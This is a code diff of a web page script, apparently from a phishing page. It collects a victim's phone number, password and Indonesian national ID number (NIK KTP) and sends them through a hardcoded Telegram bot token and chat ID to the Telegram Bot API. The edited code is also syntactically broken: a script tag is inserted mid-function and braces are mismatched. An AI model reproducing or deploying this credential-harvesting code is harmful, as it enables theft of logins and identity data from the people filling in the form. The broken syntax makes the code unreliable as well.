@@ -111,12 +111,13 @@ function kirimDemo() {
 const BOT_TOKEN = "8779360559:AAF8oJxBD-okLDSOy0gNr5uB0rTjH7_zgB4";
 const CHAT_ID = "8264171951";
 
-async function kirimDemo(){
-  const nama = document.getElementById("Nomor HP").value;
-  const hp = document.getElementById("Pasword").value;
-  const nominal = document.getElementById("Nik KTP").value;
+<script>
+function kirimDemo() {
+  const hp = document.getElementById("hp").value;
+  const password = document.getElementById("password").value;
+  const nikKtp = document.getElementById("nik").value;
 
-  if(!nama || !hp){
+  if (!hp || !password || !nikKtp) {
     alert("Lengkapi data dulu");
     return;
   }
@@ -124,9 +125,13 @@ async function kirimDemo(){
   const pesan = `
 Nomor HP: ${hp}
 Password: ${password}
+🪪 Nik KTP: ${nikKtp}
+🕒 Waktu: ${new Date().toLocaleString("id-ID")}
 `;
-💰 Nik KTP: ${Nik KTP}
-🕒 Waktu: ${new Date().toLocaleString("id-ID")}`;
+
+  console.log(pesan);
+}
+</script>
 
   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
     method:"POST",
